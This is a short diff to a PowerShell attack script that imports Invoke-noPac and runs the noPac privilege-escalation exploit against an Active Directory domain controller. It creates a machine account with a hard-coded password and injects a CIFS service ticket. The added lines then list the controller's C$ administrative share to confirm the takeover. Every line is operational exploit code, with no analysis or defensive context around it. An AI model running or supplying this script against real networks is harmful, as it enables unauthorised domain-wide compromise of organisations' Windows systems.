@@ -14,3 +14,8 @@ $domain = (gwmi win32_computersystem).Domain
 $DCvar = "$DC.$domain"
 import-module .\Invoke-noPac.ps1
 Invoke-noPac "-domain $domain -user $username -pass $password /enctype rc4 /dc $DCvar /mAccount newmachine /mPassword Password123 /service cifs /ptt"
+Start-Sleep 5 
+$DC= Get-Content DC.txt
+$domain= (gwmi win32_computersystem).Domain
+$DCvar= "$DC.$domain"
+ls "\\$DCvar\C$"
